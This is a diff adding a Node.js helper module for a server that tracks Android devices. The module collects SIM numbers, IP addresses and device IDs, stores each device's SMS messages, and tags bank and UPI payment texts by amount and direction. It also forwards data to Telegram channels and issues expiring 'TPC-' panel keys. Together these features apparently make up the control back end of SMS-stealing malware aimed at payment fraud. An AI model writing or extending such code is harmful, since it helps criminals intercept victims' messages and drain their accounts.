@@ -1,0 +1,463 @@
+"use strict";
+
+const crypto = require("crypto");
+const config = require("./config");
+const db = require("./database");
+
+// ------------------------------------------------------------------ errors
+
+class HttpError extends Error {
+  constructor(status, message) {
+    super(message);
+    this.status = status;
+  }
+}
+
+const HASH_FIELDS = new Set([
+  "registration_id_hash", "password_hash", "key_hash", "session_token_hash",
+]);
+
+// ------------------------------------------------------------------ hashing
+
+function hashValue(v) {
+  return crypto.createHash("sha256").update(String(v), "utf8").digest("hex");
+}
+
+// ------------------------------------------------------------- normalizers
+
+function normalizeNumber(raw) {
+  if (raw === null || raw === undefined) return "";
+  let s = String(raw).trim().replace(/[^\d+]/g, "");
+  if (!s) return "";
+  if (!s.startsWith("+")) s = "+" + s.replace(/^\+/, "");
+  const digits = s.replace(/^\+/, "");
+  if (!/^\d+$/.test(digits) || digits.length < 6 || digits.length > 15) return "";
+  return s;
+}
+
+function normChannelId(raw) {
+  let s = String(raw ?? "").trim();
+  if (!s) return "";
+  s = s.replace(/\s+/g, "").replace(/^@+/, "");
+  return /^-?\d+$/.test(s) ? String(parseInt(s, 10)) : s;
+}
+
+function chanKey(v) {
+  let s = String(v ?? "").replace(/[^\d]/g, "");
+  if (!s) return "";
+  if (s.startsWith("100") && s.length > 10) s = s.slice(3);
+  return s;
+}
+
+function canonicalChannelId(ent, fallback = null) {
+  const id = ent && ent.id;
+  if (typeof id === "number" || (typeof id === "string" && /^-?\d+$/.test(id))) {
+    const n = Number(id);
+    if (ent.broadcast || ent.megagroup) return String(Number("-100" + n));
+    return String(-Math.abs(n));
+  }
+  return fallback !== null && fallback !== undefined ? String(fallback) : "";
+}
+
+function asEntity(cid) {
+  const s = String(cid).trim().replace(/^@+/, "");
+  return /^-?\d+$/.test(s) ? parseInt(s, 10) : s;
+}
+
+function normalizeKey(raw) {
+  return String(raw || "").replace(/[^A-Za-z0-9]/g, "").toUpperCase();
+}
+
+// ------------------------------------------------------------- serializers
+
+function serializeDt(v) {
+  if (v instanceof Date) return v.toISOString();
+  if (v === null || v === undefined || typeof v === "boolean" || typeof v === "number") return v;
+  return String(v);
+}
+
+function serializeDocument(doc) {
+  const out = {};
+  for (const [k, v] of Object.entries(doc)) {
+    if (k === "_id") { out.id = String(v); continue; }
+    if (HASH_FIELDS.has(k)) continue;
+    const isPlain = v && typeof v === "object" && !(v instanceof Date) && !(v instanceof db.ObjectId);
+    out[k] = isPlain ? v : serializeDt(v);
+  }
+
+  const ls = doc.last_seen;
+  if (ls instanceof Date) {
+    out.status = Date.now() - ls.getTime() < config.ONLINE_WINDOW_SECONDS * 1000
+      ? "Online" : "Offline";
+  } else {
+    out.status = "Offline";
+  }
+  return out;
+}
+
+// --------------------------------------------------------------- telemetry
+
+function sanitizeTelemetry(raw) {
+  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return {};
+  const clean = {};
+
+  for (const [k0, value] of Object.entries(raw).slice(0, config.MAX_TELEMETRY_KEYS)) {
+    if (typeof k0 !== "string" || !k0) continue;
+    const key = k0.slice(0, 60);
+
+    if (value === null || typeof value === "boolean" || typeof value === "number") {
+      clean[key] = value;
+    } else if (typeof value === "string") {
+      clean[key] = value.slice(0, config.MAX_TELEMETRY_STRING);
+    } else if (Array.isArray(value)) {
+      clean[key] = value.slice(0, 20).map((item) => {
+        if (item === null || typeof item === "boolean" || typeof item === "number") return item;
+        if (typeof item === "string") return item.slice(0, config.MAX_TELEMETRY_STRING);
+        if (item && typeof item === "object") {
+          const o = {};
+          for (const [k, v] of Object.entries(item).slice(0, 20)) {
+            if (v === null || ["boolean", "number", "string"].includes(typeof v)) {
+              o[String(k).slice(0, 40)] = typeof v === "string" ? v.slice(0, config.MAX_TELEMETRY_STRING) : v;
+            }
+          }
+          return o;
+        }
+        return undefined;
+      });
+    } else if (value && typeof value === "object") {
+      const o = {};
+      for (const [k, v] of Object.entries(value).slice(0, 20)) {
+        if (v === null || ["boolean", "number", "string"].includes(typeof v)) {
+          o[String(k).slice(0, 40)] = typeof v === "string" ? v.slice(0, config.MAX_TELEMETRY_STRING) : v;
+        }
+      }
+      clean[key] = o;
+    }
+  }
+  return clean;
+}
+
+function telemetrySummary(t) {
+  const sims = t.sims;
+  let first = Array.isArray(sims) && sims.length ? sims[0] : {};
+  if (!first || typeof first !== "object") first = {};
+
+  return {
+    device_model: t.model || "",
+    android_version: t.android_version || "",
+    sim_carrier: t.sim_carrier || first.carrier || "",
+    sim_number: t.sim_number || first.number || "",
+    sim_number_source: t.sim_number_source || first.number_source || "",
+    sim_count: Array.isArray(sims) ? sims.length : 0,
+    battery_level: t.battery_level,
+    battery_charging: t.battery_charging,
+    network_type: t.network_type || "",
+    local_ip: t.local_ip || "",
+    telemetry_updated_at: db.utcNow(),
+  };
+}
+
+function simSlotCount(device) {
+  const t = (device || {}).telemetry || {};
+  const sims = t.sims;
+  let n = Array.isArray(sims) ? sims.length : 0;
+  if (n <= 0) n = parseInt(t.sim_count || 0, 10) || 0;
+  return Math.max(1, Math.min(n, 2));
+}
+
+function resolveDeviceNumber(device) {
+  if (!device) return "";
+  const t = device.telemetry || {};
+
+  for (const cand of [t.sim_number, t.phone_number, device.sim_number, device.phone_number]) {
+    const n = normalizeNumber(cand);
+    if (n) return n;
+  }
+  if (Array.isArray(t.sims)) {
+    for (const s of t.sims) {
+      if (s && typeof s === "object") {
+        const n = normalizeNumber(s.number);
+        if (n) return n;
+      }
+    }
+  }
+  return "";
+}
+
+// ---------------------------------------------------------------- device id
+
+function deviceShortId(device) {
+  return device.short_id || "TPC-" + String(device._id || "").slice(-6).toUpperCase();
+}
+
+async function nextDeviceShortId() {
+  try {
+    const doc = await db.counters.findOneAndUpdate(
+      { _id: "device_seq" },
+      { $inc: { seq: 1 } },
+      { upsert: true, returnDocument: "after" },
+    );
+    return "TPC-" + String(parseInt(doc.seq, 10)).padStart(4, "0");
+  } catch (_) {
+    return "TPC-" + String(Math.floor(Date.now() / 1000) % 100000).padStart(4, "0");
+  }
+}
+
+async function backfillShortIds() {
+  try {
+    const cur = db.devices
+      .find({ short_id: { $exists: false } }, { projection: { _id: 1 } })
+      .limit(10000);
+    for await (const d of cur) {
+      await db.devices.updateOne(
+        { _id: d._id },
+        { $set: { short_id: await nextDeviceShortId() } },
+      );
+    }
+  } catch (_) {}
+}
+
+async function backfillAutoSender() {
+  try {
+    await db.devices.updateMany(
+      { auto_sender: { $exists: false } },
+      {
+        $set: {
+          auto_sender: {
+            enabled: false, channel_id: null, channel_title: null,
+            sim_slots: [], tg_confirm: true, updated_at: db.utcNow(),
+          },
+        },
+      },
+    );
+    await db.devices.updateMany(
+      { "auto_sender.both_sims": { $exists: true } },
+      { $unset: { "auto_sender.both_sims": "" } },
+    );
+  } catch (_) {}
+}
+
+// -------------------------------------------------------------- auto sender
+
+function normSlots(raw) {
+  if (!raw || !Array.isArray(raw)) return [];
+  const out = new Set();
+  for (const v of raw) {
+    const i = parseInt(v, 10);
+    if (i === 0 || i === 1) out.add(i);
+  }
+  return [...out].sort((a, b) => a - b);
+}
+
+function autoSenderOf(device) {
+  const a = (device || {}).auto_sender || {};
+  let slots = normSlots(a.sim_slots);
+  if (!slots.length && a.both_sims) slots = [0, 1];
+
+  return {
+    enabled: !!a.enabled,
+    channel_id: String(a.channel_id || ""),
+    channel_title: a.channel_title || "",
+    sim_slots: slots,
+    tg_confirm: a.tg_confirm === undefined ? true : !!a.tg_confirm,
+    updated_at: serializeDt(a.updated_at),
+  };
+}
+
+function autoSenderPlain(device) {
+  const a = autoSenderOf(device);
+  return {
+    enabled: a.enabled,
+    channel_id: a.channel_id,
+    channel_title: a.channel_title,
+    sim_slots: a.sim_slots,
+    tg_confirm: a.tg_confirm,
+  };
+}
+
+async function applyTelemetry(device, raw) {
+  const telemetry = sanitizeTelemetry(raw);
+  if (!Object.keys(telemetry).length) return {};
+
+  const merged = { ...(device.telemetry || {}), ...telemetry };
+  const fields = { telemetry: merged, ...telemetrySummary(merged) };
+  if (merged.sim_number) fields.number_requested_at = null;
+
+  await db.devices.updateOne({ _id: device._id }, { $set: fields });
+  return telemetry;
+}
+
+// -------------------------------------------------------------- classifier
+
+function classifySms(address, body) {
+  const lower = String(body || "").toLowerCase();
+  let kind = "sms";
+
+  if (config.UPI_KEYWORDS.some((k) => lower.includes(k))) kind = "upi";
+
+  let amount = null;
+  const m = config.AMOUNT_RE.exec(body || "");
+  if (m) {
+    const n = parseFloat(m[1].replace(/,/g, ""));
+    if (Number.isFinite(n)) amount = n;
+  }
+
+  let flow = null;
+  if (["credited", "received", "cr.", "deposited"].some((w) => lower.includes(w))) flow = "credit";
+  else if (["debited", "paid", "sent", "dr.", "withdrawn"].some((w) => lower.includes(w))) flow = "debit";
+
+  return { kind, amount, flow };
+}
+
+// ------------------------------------------------------------------ events
+
+async function logEvent(eventType, details = null, deviceId = null, adminId = null) {
+  try {
+    await db.activity_logs.insertOne({
+      event_type: eventType,
+      details,
+      device_id: deviceId,
+      admin_id: adminId,
+      created_at: db.utcNow(),
+    });
+  } catch (_) {}
+}
+
+// -------------------------------------------------------------- device view
+
+function deviceAgeSeconds(d) {
+  const ls = d.last_seen;
+  if (!(ls instanceof Date)) return null;
+  return (Date.now() - ls.getTime()) / 1000;
+}
+
+function deviceInstallState(d) {
+  if (d.install_state === "gone") return "gone";
+  const age = deviceAgeSeconds(d);
+  if (age === null) return "unknown";
+  if (age > config.STALE_AFTER_DAYS * 86400) return "uninstalled";
+  if (age > config.IDLE_AFTER_HOURS * 3600) return "stale";
+  return "active";
+}
+
+function viewDevice(d, includeHash = false) {
+  const hub = require("./hub"); // lazy -> avoids load-time cycle
+  const s = serializeDocument(d);
+
+  s.short_id = deviceShortId(d);
+  s.ws_connected = hub.hub.online(s.id);
+  s.live_number = resolveDeviceNumber(d);
+  s.entered_number = normalizeNumber(d.phone_number) || (d.phone_number || "");
+  s.auto_sender = autoSenderPlain(d);
+
+  const t = d.telemetry || {};
+  s.install_state = deviceInstallState(d);
+  s.install_id = d.install_id || t.install_id || "";
+  s.android_id = d.android_id || t.android_id || "";
+  s.install_seq = parseInt(d.install_seq || 1, 10);
+  s.app_version = d.app_version || t.app_version || "";
+  s.installed_at = serializeDt(d.installed_at || d.first_seen);
+  s.uninstalled_at = serializeDt(d.uninstalled_at);
+
+  if (!includeHash) delete s.registration_id;
+  return s;
+}
+
+async function getDeviceOr404(deviceId) {
+  let d;
+  try {
+    d = await db.devices.findOne({ _id: new db.ObjectId(deviceId) });
+  } catch (_) {
+    throw new HttpError(400, "Bad device id");
+  }
+  if (!d) throw new HttpError(404, "Device not found");
+  return d;
+}
+
+// ----------------------------------------------------------------- messages
+
+function dedupeKey(deviceId, direction, address, body, when) {
+  const ms = when instanceof Date ? when.getTime() : Date.now();
+  const stamp = Math.floor(ms / 60000);
+  return `${deviceId}|${direction}|${address}|${hashValue(body).slice(0, 16)}|${stamp}`;
+}
+
+async function insertMessage(doc, dedupe = true) {
+  try {
+    if (dedupe) {
+      const key = dedupeKey(
+        doc.device_id, doc.direction, doc.address || "",
+        doc.body || "", doc.created_at || db.utcNow(),
+      );
+      doc.dedupe_key = key;
+      if (await db.messages.findOne({ dedupe_key: key })) return null;
+    }
+    const res = await db.messages.insertOne(doc);
+    return res.insertedId;
+  } catch (_) {
+    return null;
+  }
+}
+
+// --------------------------------------------------------------------- keys
+
+function newKey() {
+  const A = config.KEY_ALPHABET;
+  const part = () => Array.from({ length: 4 }, () => A[crypto.randomInt(A.length)]).join("");
+  return "TPC-" + [part(), part(), part()].join("-");
+}
+
+async function keyDoc(key) {
+  const k = normalizeKey(key);
+  if (k.length < 8) return null;
+  try {
+    return await db.panel_keys.findOne({ key_hash: hashValue(k) });
+  } catch (_) {
+    return null;
+  }
+}
+
+function keyActive(doc) {
+  if (!doc) return false;
+  if (doc.blocked) return false;
+  const exp = doc.expires_at;
+  if (exp instanceof Date) return exp.getTime() > Date.now();
+  return true;
+}
+
+module.exports = {
+  HttpError,
+  HASH_FIELDS,
+  hashValue,
+  normalizeNumber,
+  normChannelId,
+  chanKey,
+  canonicalChannelId,
+  asEntity,
+  normalizeKey,
+  serializeDt,
+  serializeDocument,
+  sanitizeTelemetry,
+  telemetrySummary,
+  simSlotCount,
+  resolveDeviceNumber,
+  deviceShortId,
+  nextDeviceShortId,
+  backfillShortIds,
+  backfillAutoSender,
+  normSlots,
+  autoSenderOf,
+  autoSenderPlain,
+  applyTelemetry,
+  classifySms,
+  logEvent,
+  deviceAgeSeconds,
+  deviceInstallState,
+  viewDevice,
+  getDeviceOr404,
+  dedupeKey,
+  insertMessage,
+  newKey,
+  keyDoc,
+  keyActive,
+};
